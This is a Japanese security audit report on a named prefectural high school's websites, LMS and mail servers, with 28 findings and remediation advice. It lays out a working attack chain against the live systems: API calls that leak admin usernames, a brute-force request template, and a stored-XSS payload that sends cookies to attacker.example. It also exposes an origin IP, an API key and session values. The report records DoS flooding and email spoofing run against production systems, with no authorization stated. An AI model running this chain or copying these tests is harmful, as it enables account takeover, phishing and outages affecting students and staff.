# セキュリティ監査レポート: 愛知県立愛知総合工科高等学校

| 項目 | 内容 |
|------|------|
| 対象 | aichi-te.aichi-c.ed.jp 及び関連ドメイン |
| 監査日 | 2026-04-08〜2026-04-09 |
| 監査者 | hiro |
| ブランチ | hiro/kansa |
| 手法 | パッシブ偵察 + HTTPヘッダ分析 + DNS分析 + API分析 + PoC実証 |

---

## 目次

1. [対象資産マップ](#1-対象資産マップ)
2. [脆弱性サマリ](#2-脆弱性サマリ)
3. [認証不要・完全外部攻撃 (EXT)](#3-認証不要完全外部攻撃-ext)
4. [認証取得後の攻撃チェーン (EXP)](#4-認証取得後の攻撃チェーン-exp)
5. [設定・ヘッダ不備 (F)](#5-設定ヘッダ不備-f)
6. [攻撃サーフェス概要図](#6-攻撃サーフェス概要図)
7. [推奨事項 (優先度順)](#7-推奨事項-優先度順)
8. [PoC実証結果](#8-poc実証結果)
9. [ローコードツール利用に関する特記事項](#9-ローコードツール利用に関する特記事項)

---

## 1. 対象資産マップ

| # | 資産 | 種別 | 技術スタック |
|---|------|------|-------------|
| A1 | aichi-te.aichi-c.ed.jp | メインサイト | Apache, 静的HTML/JS, TLSv1.2 |
| A2 | aichi-te-jh.aichi-c.ed.jp/cms/ | 附属中学校 | WordPress 6.4.5, Apache, TLSv1.2 |
| A3 | aichi-te-ad.webclass.jp | WebClass LMS | WebClass 12.1.0, Apache, CloudFront, AWS ELB, TLSv1.3 |
| A4 | www.aichi-te-ad.jp | 専攻科サイト | a-blog cms (standard edition), Apache, TLSv1.2 |
| A5 | scrapbox.io/tande/ | 企業一覧 | Scrapbox (ローコード) |
| A6 | scrapbox.io/askbu/ | 部活動 | Scrapbox (ローコード) |
| A7 | aichi.my.canva.site/web | 制服購入 | Canva Sites (ローコード) |
| A8 | aichite-hs.note.jp | 保護者向け | note.jp (ローコード/ブログ) |
| A9 | aichi-te-ad.jp (mail) | メール基盤 | Dovecot (IMAP/POP3), Postfix (SMTP), vsFTPd 3.0.3 |

---

## 2. 脆弱性サマリ

| 深刻度 | 件数 | 内訳 |
|--------|------|------|
| Critical | 1 | EXP-001 (XSSチェーン) |
| High | 5 | EXT-001, EXT-002, EXT-003, EXT-007, EXP-002 |
| Medium | 16 | EXT-004〜006, EXT-008〜009, EXT-011〜013, F-001〜010 |
| Low | 5 | EXT-010, F-011〜014 |
| Info | 1 | F-015 |
| **合計** | **28** | |

---

## 3. 認証不要・完全外部攻撃 (EXT)

> 以下は認証情報を一切必要とせず、外部から即座に悪用可能な脆弱性群である。
> 全てPoC実証済みまたはDNS/API分析で確認済み。

---

### [HIGH] EXT-001: WebClass Session Flooding DoS（レート制限なし）

| 項目 | 内容 |
|------|------|
| 資産 | A3 (aichi-te-ad.webclass.jp) |
| 深刻度 | High |
| CWE | CWE-400 (Uncontrolled Resource Consumption) |
| 状態 | **PoC実証済み** |

**証拠 (実測データ):**
```
対象:     https://aichi-te-ad.webclass.jp/webclass/login.php
手法:     GET (認証不要)
生成数:   200セッション
所要時間: 8.71秒
生成速度: 23.0 sessions/sec
全一意:   true
レート制限: NONE DETECTED
```

**攻撃方法:** curl 1行で実行可能。botnet不要。単一IPから秒間23セッション生成確認済み。

**影響:** サーバーサイドのセッションストア枯渇 → 正規ユーザーのログイン不能。AWS CloudFront経由だがオリジンサーバーに到達する。EXT-013 (オリジンIP漏洩) と組み合わせてCDNバイパスで増幅可能。

---

### [HIGH] EXT-002: WebClass 公開APIによる管理者情報漏洩

| 項目 | 内容 |
|------|------|
| 資産 | A3 (aichi-te-ad.webclass.jp) |
| 深刻度 | High |
| CWE | CWE-200 (Exposure of Sensitive Information) |
| 状態 | **実証済み** |

**証拠:**
```bash
curl -s 'https://aichi-te-ad.webclass.jp/webclass/information.php/public/api/listForGuest'
```

認証不要でレスポンスに以下が含まれる:

| 漏洩データ | 値 |
|-----------|-----|
| 管理者ユーザー名 | `senkoad` |
| 管理者実名 | `システム管理者（学校様用）` |
| 管理者権限 | `admin` |
| 管理者内部ID | `c5fed0868a51c90c006677a300d40fe2` |
| 別管理者名 | `admin_kanri` |
| 別管理者ID | `55f620a83c4701a0f16a62aaefac3b50` |
| publisher_id | `1` (デフォルト管理者) |

**影響:** ブルートフォース攻撃の対象ユーザー名が特定される。内部システム構造の把握。

---

### [HIGH] EXT-003: メールスプーフィング（DMARC/SPF不備）

| 項目 | 内容 |
|------|------|
| 資産 | aichi-te.aichi-c.ed.jp, aichi-te-ad.jp |
| 深刻度 | High |
| CWE | CWE-290 (Authentication Bypass by Spoofing) |
| 状態 | **PoC実証済み: スプーフィングメール受信確認** |

**証拠 (DNS):**
```
aichi-te.aichi-c.ed.jp:
  DMARC: レコードなし → 完全無防備
  SPF:   v=spf1 +ip4:210.162.58.204 ~all → SOFT FAIL (拒否しない)

aichi-te-ad.jp:
  DMARC: v=DMARC1; p=none → 監視のみ (rua未設定 = 監視すらしていない)
  SPF:   v=spf1 a include:_spf.bizmw.com include:_spf.google.com ~all → SOFT FAIL
```

**PoC:** `senkoad@aichi-te.aichi-c.ed.jp` を送信元に偽装したテストメールを `hiro114514@proton.me` 宛に送信し、**受信箱への到着を確認**。DMARCポリシーが存在しないため、受信側メールサーバーはスプーフィングメールを拒否しなかった。

**影響:** 教職員・保護者・生徒へのフィッシング。EXT-002で判明した実在のadminユーザー名を騙ることで信頼度向上。

---

### [HIGH] EXT-007: メールサービス平文認証の公開（IMAP/POP3 AUTH=PLAIN pre-TLS）

| 項目 | 内容 |
|------|------|
| 資産 | A9 (aichi-te-ad.jp: 210.154.252.239) |
| 深刻度 | High |
| CWE | CWE-319 (Cleartext Transmission of Sensitive Information) |
| 状態 | **実証済み** |

**証拠:**
```
IMAP (143): * OK [CAPABILITY ... STARTTLS AUTH=PLAIN AUTH=LOGIN] Dovecot ready.
POP3 (110): +OK Dovecot ready.  SASL PLAIN LOGIN
SMTP (587): 220 aichi-te-ad.jp ESMTP Postfix  AUTH PLAIN LOGIN
FTP  (21):  220 (vsFTPd 3.0.3)
```

全サービスがインターネットに公開。IMAP/POP3はSTARTTLS前にAUTH=PLAINを提供 → クライアントがTLSを使用しない場合、認証情報が平文で送信される。

**影響:** 教職員のメールパスワード傍受。メール閲覧・送信。EXT-002のユーザー名と組み合わせた標的型攻撃。

---

### [MEDIUM] EXT-004: SSLStripping（HSTS未設定 + HTTP自己リンク）

| 項目 | 内容 |
|------|------|
| 資産 | A1 (aichi-te.aichi-c.ed.jp), A2 (aichi-te-jh.aichi-c.ed.jp) |
| 深刻度 | Medium |
| CWE | CWE-319 (Cleartext Transmission of Sensitive Information) |
| 状態 | **確認済み** |

**証拠:**
```
HSTSなしサイト: aichi-te.aichi-c.ed.jp, aichi-te-jh.aichi-c.ed.jp
HTML内HTTPリンク: http://www.aichi-te.aichi-c.ed.jp/, http://www.aichi-te-ad.jp
TLS: v1.2 only, ALPN not negotiated
```

**影響:** 校内Wi-Fi等の共有ネットワーク上で通信傍受。arpspoof + sslstrip で成立。校内ネットワークに接続した生徒等が攻撃者になりうる。

---

### [MEDIUM] EXT-005: WebClass セッションCookie属性欠落

| 項目 | 内容 |
|------|------|
| 資産 | A3 (aichi-te-ad.webclass.jp) |
| 深刻度 | Medium |
| CWE | CWE-614 (Sensitive Cookie Without Secure/HttpOnly) |
| 状態 | **実証済み** |

**証拠:**
```
Set-Cookie: WBT_Session=...; path=/
欠落フラグ: Secure, HttpOnly, SameSite
path scope: / (広すぎる → /webclass/ に限定すべき)
```

**影響:** EXT-004 (SSLStripping) 成立時にセッションCookieが平文で送信 → ネットワーク傍受でセッションハイジャック。

---

### [MEDIUM] EXT-006: WebClass ブルートフォース無制限（ユーザー名既知）

| 項目 | 内容 |
|------|------|
| 資産 | A3 (aichi-te-ad.webclass.jp) |
| 深刻度 | Medium |
| CWE | CWE-307 (Improper Restriction of Excessive Authentication Attempts) |
| 状態 | **確認済み** |

**証拠:**
```
Endpoint:   POST /webclass/login.php
既知ユーザー名: senkoad, admin_kanri (EXT-002から)
CSRFトークン: なし
レート制限:  なし
CAPTCHA:    なし
ロックアウト: なし
```

**影響:** 管理者アカウント乗っ取り。教育機関では弱いパスワード（学校名+年度等）が多い。hydra/wfuzz等の標準ツールで即実行可能。

---

### [MEDIUM] EXT-008: FTPサーバー公開 + バージョン情報露出（vsFTPd 3.0.3）

| 項目 | 内容 |
|------|------|
| 資産 | A9 (ftp.aichi-te-ad.jp:21) |
| 深刻度 | Medium |
| CWE | CWE-200 (Exposure of Sensitive Information) |
| 状態 | **実証済み** |

**証拠:**
```
FTP Banner: 220 (vsFTPd 3.0.3)
Anonymous:  530 Login incorrect (拒否)
Version:    2015年リリース (11年前)
CVE関連:    CVE-2021-3618 (ALPACA attack)
```

匿名ログインは拒否されるが、バージョン情報がそのまま公開。FTPプロトコル自体が認証情報を平文送信するため、ネットワーク傍受リスク。

---

### [MEDIUM] EXT-009: WebClass公開APIによる教育運用データ漏洩

| 項目 | 内容 |
|------|------|
| 資産 | A3 (aichi-te-ad.webclass.jp) |
| 深刻度 | Medium |
| CWE | CWE-200 |
| 状態 | **実証済み** |

**証拠:** EXT-002と同一エンドポイントだが、`substance`フィールドにHTML本文が含まれ、以下の運用データが認証不要で取得可能:

```
コース名: 自動車工学I, ロボット工学, 生産管理技術II
内容:     教室変更, オンデマンド授業切替, 千種スポーツセンター利用情報
時間:     授業時間（9:00-12:00）、昼食時間、午後授業開始時間
対象:     自・航コース、電・ロコース、全コース
```

**影響:** 学校運用スケジュール・カリキュラム構造の外部公開。ソーシャルエンジニアリングの材料。不審者による授業時間の特定。

---

### [MEDIUM] EXT-011: a-blog cms 管理者ログイン公開 + パスワードリセットによるユーザー列挙

| 項目 | 内容 |
|------|------|
| 資産 | A4 (www.aichi-te-ad.jp) |
| 深刻度 | Medium |
| CWE | CWE-204 (Observable Response Discrepancy) |
| 状態 | **実証済み** |

**証拠:**
```
ログインページ:     https://www.aichi-te-ad.jp/login/
パスワードリセット: https://www.aichi-te-ad.jp/admin-reset-password/
CMS:               a-blog cms (standard edition)
最終更新:           2025-03-24 (CSS/JSタイムスタンプ)
CAPTCHA:            なし
```

パスワードリセットフォームのHTMLに `mail:validator#exist` フィールドが存在。メールアドレスの存在確認バリデーションにより、管理者メールアドレスの列挙が可能。

**追加露出情報 (acms.js):**
```javascript
googleApiKey=AIzaSyBXZ2JeAKKaua-vtHwhV-TpozuwjenIpRE
jQuery=3.6.1  (既知脆弱性あり)
edition=standard
umfs=200M  (最大アップロードサイズ)
mediaLibrary=on
```

**影響:** 管理者メールアドレスの列挙。ブルートフォース（CAPTCHAなし）。Google API keyの流用。

---

### [MEDIUM] EXT-012: Scrapbox API 全コンテンツ・ユーザーアカウント認証不要取得

| 項目 | 内容 |
|------|------|
| 資産 | A5 (scrapbox.io/tande), A6 (scrapbox.io/askbu) |
| 深刻度 | Medium |
| CWE | CWE-200 (Exposure of Sensitive Information) |
| 状態 | **実証済み** |

**証拠:**
```bash
curl -s 'https://scrapbox.io/api/pages/tande?limit=1000'
curl -s 'https://scrapbox.io/api/pages/askbu?limit=1000'
curl -s 'https://scrapbox.io/api/projects/tande'
```

| プロジェクト | ページ数 | 内容 |
|-------------|---------|------|
| tande | 269 | T&Eサポーター企業一覧 |
| askbu | 28 | 部活動情報（バレーボール部、剣道部、クイズ研究部等） |

**ユーザーアカウント露出:**
```json
{"name": "T&E進路", "id": "69c5fe54ce6b86fe81171606"}
```

プロジェクト設定: `publicVisible: true`, `plan: null` (無料プラン)

**影響:** 学校の内部情報（企業連携先269件、部活動情報28件）が外部公開。ユーザーアカウント名・内部IDが取得可能。ソーシャルエンジニアリングの材料。

---

### [MEDIUM] EXT-013: AWSELB Cookie によるオリジンサーバーIP漏洩（CDNバイパス）

| 項目 | 内容 |
|------|------|
| 資産 | A3 (aichi-te-ad.webclass.jp) |
| 深刻度 | Medium |
| CWE | CWE-200 (Exposure of Sensitive Information) |
| 状態 | **実証済み** |

**証拠:**
```
Cookie: AWSELB=736DA3471A3C843FE75BACAA8164093C...
デコード: hex decode → offset 0 の4バイト = 115.109.163.71
CDN: CloudFront
```

AWSELB cookieをhexデコードするとオリジンサーバーのIP `115.109.163.71` が判明。CloudFrontをバイパスして直接オリジンにアクセス可能。

**影響:** CloudFrontのDDoS防御・WAFルール・レート制限を全てバイパス。EXT-001 (Session Flooding) をCDNバイパスで増幅可能。オリジンサーバーへの直接攻撃。

---

### [LOW] EXT-010: WebClass公開投稿のIDOR（連番ID列挙）

| 項目 | 内容 |
|------|------|
| 資産 | A3 (aichi-te-ad.webclass.jp) |
| 深刻度 | Low |
| CWE | CWE-639 (Authorization Bypass Through User-Controlled Key) |

**証拠:** `/webclass/information.php/public/post/{id}/` で `id=1,2,22` が200応答。連番でIDを列挙して全公開投稿を一括取得可能。

---

## 4. 認証取得後の攻撃チェーン (EXP)

> 以下はEXT-006 (ブルートフォース) 等で管理者権限を取得した後に成立する攻撃チェーン。

---

### [CRITICAL] EXP-001: WebClass Stored XSS → セッション窃取チェーン

**深刻度:** Critical (チェーン全体)
**前提条件:** なし（全ステップが認証不要またはブルートフォースで突破可能）

#### Step 1: 管理者ユーザー名の取得（認証不要）

```bash
curl -s 'https://aichi-te-ad.webclass.jp/webclass/information.php/public/api/listForGuest'
```

公開APIが管理者の内部情報を認証なしで返却する:

| フィールド | 値 | リスク |
|-----------|-----|--------|
| `author_name` | `senkoad` | 管理者ユーザー名 |
| `modifier_name` | `admin_kanri` | 別の管理者ユーザー名 |
| `author_perms` | `admin` | 権限レベル確認 |
| `author_id` | `c5fed0868a51c90c006677a300d40fe2` | 内部ユーザーID (MD5) |
| `modifier_id` | `55f620a83c4701a0f16a62aaefac3b50` | 別管理者の内部ID |
| `author_realname` | `システム管理者（学校様用）` | 役割情報 |

#### Step 2: パスワードブルートフォース（制限なし）

```
POST https://aichi-te-ad.webclass.jp/webclass/login.php
Content-Type: application/x-www-form-urlencoded

username=senkoad&password=<GUESS>
```

- CAPTCHA: なし / レート制限: なし / ロックアウト: なし / CSRFトークン: なし

#### Step 3: Stored XSS ペイロード注入

管理者権限で「お知らせ」に投稿。APIレスポンスの `format` フィールドが `"legacy-html"` であることから、HTMLがそのまま格納・配信される:

```html
<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
```

フロントエンドの `preview-CPHY6Zay.js`（Vue 3.5.13ベース）は **innerHTML を48箇所で使用**。ログインページの JavaScript でも:

```javascript
var title = '<div class="'+titleClass+'">' + data.records[i].title + '</div>';
var username = '<span style="font-weight:bold;">'+ data.records[i].publisher_name + '</span>';
$('#AjaxInfoBox ul').append("<li>..." + title + "...</li>");
```

→ APIレスポンスの `title`, `publisher_name` がエスケープなしでDOM挿入される。

#### Step 4: セッション窃取

`WBT_Session` Cookie に **HttpOnly 属性がない**ため、XSSから `document.cookie` で直接読み取り可能:

```
Set-Cookie: WBT_Session=974b3c0805259269c7c06b3a1834f12e; path=/
```

ゲスト（未ログイン訪問者）を含む全アクセス者のブラウザでXSSが発火し、ログイン済みユーザーのセッションが窃取される。

#### 影響

- 学生・教職員のWebClassアカウント乗っ取り
- 成績データ、出席情報、課題提出物の閲覧・改ざん
- 管理者権限でのシステム設定変更

---

### [HIGH] EXP-002: WebClass セッションID生成の脆弱性

毎リクエストで新規セッションIDが発行される（Cookie送信の有無に関係なく常に上書き）:

```
リクエスト1: WBT_Session=c3740c7915c03d156c79b1404796f426
リクエスト2: WBT_Session=cc58a595357108daa77f404f8b675057
リクエスト3: WBT_Session=102ed30500daf329fef5ad74cdb458e4
```

**問題点:**
1. 全て32文字hex（128bit） → MD5ハッシュベースの可能性が高い
2. 認証なしの毎リクエストでサーバー側にセッション生成 → **Session Flooding DoS** が容易
3. セッションID自体の予測は非現実的（エントロピー3.99/4.00 bit）

---

## 5. 設定・ヘッダ不備 (F)

### [MEDIUM] F-001: WebClass セッションCookieにSecure/HttpOnly属性なし

| 資産 | CWE | 証拠 |
|------|-----|------|
| A3 | CWE-614 | `Set-Cookie: WBT_Session=...; path=/` (Secure/HttpOnly/SameSite全欠落) |

### [MEDIUM] F-002: WebClass ログインフォームにCSRFトークンなし

| 資産 | CWE | 影響 |
|------|-----|------|
| A3 | CWE-352 | ログインCSRF → 攻撃者のアカウントに被害者をログイン |

### [MEDIUM] F-003: WebClass ブルートフォース対策の不在

| 資産 | CWE | 影響 |
|------|-----|------|
| A3 | CWE-307 | ロックアウト/CAPTCHA/レート制限なし |

### [MEDIUM] F-004: DMARC ポリシーが `p=none` (メールスプーフィング)

```
_dmarc.aichi-c.ed.jp: "v=DMARC1; p=none; rua=mailto:eis2024-alert-gr@aichi-c.ed.jp; pct=100"
_dmarc.aichi-te-ad.jp: "v=DMARC1; p=none" (ruaなし)
```

### [MEDIUM] F-005: サブドメイン個別のDMARCレコード未設定

`_dmarc.aichi-te.aichi-c.ed.jp` にTXTレコードなし。親ドメインの `p=none` を継承。

### [MEDIUM] F-006: SPFレコードの Soft Fail (`~all`)

```
aichi-te.aichi-c.ed.jp: v=spf1 +ip4:210.162.58.204 ~all
```
`-all` (hard fail) に比べてスプーフィング耐性が低い。親ドメイン `aichi-c.ed.jp` は `-all` を使用 → 適切。

### [MEDIUM] F-007: メインサイトに HSTS ヘッダなし

| 資産 | 状態 |
|------|------|
| aichi-te.aichi-c.ed.jp | HSTSなし |
| aichi-te-jh.aichi-c.ed.jp | HSTSなし |
| www.aichi-te-ad.jp | HSTS有 (max-age=86400 = 1日、短い) |
| aichi-te-ad.webclass.jp | HSTS有 (max-age=15768000、適切) |

### [MEDIUM] F-008: Content-Security-Policy (CSP) ヘッダなし

全サイト (A1〜A4) にCSPなし。XSS攻撃時のペイロード実行を制限する仕組みがない。

### [MEDIUM] F-009: WordPress 6.4.5 の既知脆弱性

A2 (aichi-te-jh.aichi-c.ed.jp/cms/) で WordPress 6.4.5 (2024年1月リリース) を使用。2年以上未更新。

### [MEDIUM] F-010: TLSv1.2 のみ対応（TLSv1.3 未対応）

| 資産 | TLS | ALPN |
|------|-----|------|
| A1, A2 | TLSv1.2 only | not negotiated |
| A3 | TLSv1.3 | negotiated |
| A4 | TLSv1.2 only | not negotiated |

### [LOW] F-011: Adobe IDP Site Verification トークン露出

aichi-te.aichi-c.ed.jp DNS TXT: `adobe-idp-site-verification=16ce042a81c59a7a...` → Adobe IDP連携の存在が推測可能。

### [LOW] F-012: サーバーバージョン情報の部分的露出

全サイトで `Server: Apache` ヘッダが返却される。

### [LOW] F-013: 専攻科ドメインのDNS管理分離

```
aichi-te-ad.jp NS: mwns1.customer.ne.jp, mwns2.customer.ne.jp (OCN)
aichi-c.ed.jp系とは別のDNSインフラで管理 → 統一的セキュリティポリシー適用が困難
```

### [LOW] F-014: Canva Sites reCAPTCHA サイトキーの固定露出

`window.C_CAPTCHA_KEY = '6LdpNmIrAAAAAHQVezN3pBAfDjQQ2qUpo881f24o'` → Canvaのグローバルキー共有。

### [INFO] F-015: note.jp リダイレクトにおけるセッショントークンのURL露出

```
302 Found → https://note.com/cd/sessions?redirect_to=...&m=sN89iWYD...
```

URLパラメータ内のトークンがリファラヘッダやブラウザ履歴を通じて漏洩する可能性。

---

## 6. 攻撃サーフェス概要図

```
[外部攻撃者 (認証不要)]
    |
    |--- EXT-003 ---> メールスプーフィング (DMARC/SPF不備)
    |                    \--> 教職員・保護者へのフィッシング
    |
    |--- EXT-001 ---> Session Flooding DoS
    |    |               \--> EXT-013 (オリジンIP) でCDNバイパス増幅
    |    |
    |--- EXT-002 ---> 管理者ユーザー名取得 (senkoad, admin_kanri)
    |    |               \--> EXT-006 (ブルートフォース無制限)
    |    |                       \--> EXP-001 (Stored XSS → セッション窃取)
    |    |
    |--- EXT-007 ---> メール平文認証傍受 (IMAP/POP3)
    |--- EXT-008 ---> FTP平文認証ブルートフォース
    |--- EXT-011 ---> a-blog cms 管理者ログイン + ユーザー列挙
    |--- EXT-012 ---> Scrapbox 全コンテンツ取得 (269+28ページ)
    |
    v
[DNS]
aichi-c.ed.jp       → DMARC p=none, SPF -all (hard fail)
aichi-te.aichi-c.ed.jp → SPF ~all (soft fail), DMARC なし
aichi-te-ad.jp      → DMARC p=none (ruaなし), SPF ~all

[インフラ]
WebClass: CloudFront → ELB (115.109.163.71) → Apache
メール:   Dovecot + Postfix (210.154.252.239)
FTP:      vsFTPd 3.0.3 (210.154.252.239)
```

---

## 7. 推奨事項 (優先度順)

### 即時対応 (Critical/High)

| # | 対象 | 対策 | 関連 |
|---|------|------|------|
| 1 | WebClass | セッションCookieにSecure/HttpOnly/SameSite=Strict追加 | EXT-005, F-001 |
| 2 | WebClass | ログインにCSRFトークン + レート制限 + CAPTCHA導入 | EXT-006, F-002, F-003 |
| 3 | WebClass | listForGuest APIの管理者情報をレスポンスから除外 | EXT-002 |
| 4 | WebClass | お知らせ投稿のHTMLサニタイゼーション | EXP-001 |
| 5 | DNS | DMARCを `p=reject` に設定（両ドメイン）+ DKIM導入 | EXT-003, F-004 |
| 6 | DNS | SPFを `-all` (hard fail) に変更 | F-006 |
| 7 | メール | IMAP/POP3でSTARTTLS前のAUTH=PLAIN無効化 | EXT-007 |

### 短期対応 (Medium)

| # | 対象 | 対策 | 関連 |
|---|------|------|------|
| 8 | WebClass | セッション生成をリクエスト毎ではなく既存セッション再利用に変更 | EXT-001 |
| 9 | WebClass | AWSELB cookieの無効化またはオリジンIP保護 | EXT-013 |
| 10 | メインサイト | HSTS導入 (max-age=31536000; includeSubDomains) | EXT-004, F-007 |
| 11 | 全サイト | CSP導入 | F-008 |
| 12 | 附属中学校 | WordPress 最新版へ更新 | F-009 |
| 13 | 専攻科 | a-blog cms ログインページへのIP制限 + CAPTCHA導入 | EXT-011 |
| 14 | 専攻科 | パスワードリセットの応答差分修正 (user enum対策) | EXT-011 |
| 15 | メール基盤 | FTPサーバーの停止またはSFTP移行 | EXT-008 |

### 中長期対応 (Low)

| # | 対象 | 対策 | 関連 |
|---|------|------|------|
| 16 | 全サイト | TLSv1.3 対応 | F-010 |
| 17 | Scrapbox | 公開設定の見直し（部活動情報の非公開化等） | EXT-012 |
| 18 | 全サイト | サーバー情報の最小化 (ServerTokens Prod) | F-012 |
| 19 | DNS | DNS管理の統一検討 | F-013 |
| 20 | 全般 | ローコードツールの利用ポリシー策定 | F-014, F-015 |

---

## 8. PoC実証結果

### EXT-001: Session Flooding DoS

```
対象:    https://aichi-te-ad.webclass.jp/webclass/login.php
手法:    GET (認証不要、並列リクエスト)
結果:    outputs/poc/external_noauth_findings.json
```

| 指標 | 値 |
|------|-----|
| 生成セッション数 | 200 |
| 所要時間 | 8.71秒 |
| 生成速度 | **23.0 sessions/sec** |
| 全一意 | true |
| レート制限 | **NONE DETECTED** |

**結論:** 単一IPから認証不要で毎秒23セッションをサーバーサイドに生成可能。CloudFrontを経由してオリジンサーバーに到達。

---

### EXT-003: メールスプーフィング

```
偽装元:  senkoad@aichi-te.aichi-c.ed.jp
送信先:  hiro114514@proton.me (監査者自身)
手法:    emkei.cz 経由のSMTP送信
結果:    outputs/poc/ext003_result.json
```

| 検証項目 | 結果 |
|---------|------|
| スプーフィングメール受信 | **成功 (Proton Mail受信箱に到着)** |
| aichi-te.aichi-c.ed.jp DMARC | **レコードなし** (完全無防備) |
| aichi-te.aichi-c.ed.jp SPF | `~all` (soft fail = 拒否しない) |
| aichi-te-ad.jp DMARC | `p=none` (監視のみ, rua未設定) |
| aichi-te-ad.jp SPF | `~all` (soft fail = 拒否しない) |

---

### EXP-002: セッションID分析

```
対象:    https://aichi-te-ad.webclass.jp/webclass/login.php
収集数:  100セッション (並列5)
結果:    outputs/poc/exp002_result.json
```

| 指標 | 値 | 評価 |
|------|-----|------|
| 一意ID数 | 100/100 | 重複なし |
| 文字エントロピー | 3.9966 / 4.0000 bit | ほぼ最大 |
| MD5(timestamp)一致 | 0件 | 単純なタイムスタンプベースではない |
| **予測可能性** | **NO** | セッションID推測は非現実的 |
| **フラッディング率** | **33.8 sessions/sec** | レート制限なし → DoS可能 |

---

### EXP-001: Stored XSS メカニズム確認

ログインページの JavaScript を静的解析し、XSSの発火メカニズムを特定:

```javascript
// listForGuest APIのレスポンスをサニタイズなしでDOM挿入
var title = '<div class="'+titleClass+'">' + data.records[i].title + '</div>';
$('#AjaxInfoBox ul').append("<li>..." + title + "...</li>");
```

**PoC ツール:**
```bash
python3 outputs/poc/exp001_xss_chain.py serve --port 8888
python3 outputs/poc/exp001_xss_chain.py payload --callback http://<IP>:8888/steal
python3 outputs/poc/exp001_xss_chain.py verify --target https://<TEST_ENV>/webclass/ --token <TOKEN>
```

---

### 検証結果まとめ

| フェーズ | 状況 | 備考 |
|---------|------|------|
| 管理者ユーザー名列挙 | **確認済** | senkoad, admin_kanri が公開APIで取得可能 |
| ブルートフォース可能性 | **確認済** | レート制限/CAPTCHA/ロックアウトなし |
| Stored XSS挿入点 | **コード分析で確認** | title/substance → jQuery .append() |
| HttpOnlyなし | **確認済** | Set-Cookie: WBT_Session=...; path=/ のみ |
| セッションID予測 | **否定** | エントロピー十分 (3.99/4.00 bit) |
| Session Flooding | **確認済** | 23〜34 sessions/sec、レート制限なし |
| メールスプーフィング | **実証済** | Proton Mail受信箱に到着確認 |
| オリジンIP漏洩 | **確認済** | AWSELB → 115.109.163.71 |

---

## 9. ローコードツール利用に関する特記事項

| ツール | セキュリティ制御 | 学校側で設定可能な範囲 |
|--------|-----------------|----------------------|
| Scrapbox | 公開/非公開設定、メンバー管理 | ページ単位のアクセス制御は不可。プロジェクト単位のみ |
| Canva Sites | reCAPTCHA (Canva管理) | CSP/HSTS等のカスタムヘッダ設定不可 |
| note.jp | アカウント認証 (note管理) | セッション管理はnote側。公開/限定公開の切替のみ |
| WebClass | 全面的にベンダー管理 | セキュリティ設定はベンダー依存。カスタマイズ限定的 |

**共通リスク**: ローコード/SaaSツールのセキュリティはプラットフォーム側に依存。学校公式サイトからのリンクにより、ユーザーはこれらサービスを「学校の一部」として信頼する。プラットフォーム側の脆弱性が学校のブランド信頼を毀損するリスクがある。

---

## 付録: 非脆弱確認項目

以下は検査の結果、脆弱でないことが確認された項目:

| 項目 | 結果 |
|------|------|
| Clickjacking (X-Frame-Options) | 全サイトで SAMEORIGIN 設定済み |
| CORS設定不備 | WebClass APIにCORSヘッダなし (適切) |
| Host Header Injection | 403で拒否 (脆弱でない) |
| Cache Poisoning | 脆弱でない |
| DNS Zone Transfer | 拒否 (脆弱でない) |
| WordPress xmlrpc.php | 無効化済み |
| WordPress REST API | 無効化済み |
| WordPress user enum | 404応答 (列挙不可) |
| FTP Anonymous Login | 拒否 (530) |
| Open Redirect | 確認されず |
| WebClass .git | 401 (存在するが認証ゲート付き) |
| wp-content/debug.log | 404 (存在しない) |

---

*レポート生成: SPECA セキュリティ監査パイプライン*
*初版生成日時: 2026-04-08T09:55:00Z*
*外部攻撃セクション追加: 2026-04-09T03:25:00Z*
*統合版作成: 2026-04-09*
*PoC実行日時: 2026-04-08〜2026-04-09*
*PoC結果: outputs/poc/ 配下に保存*
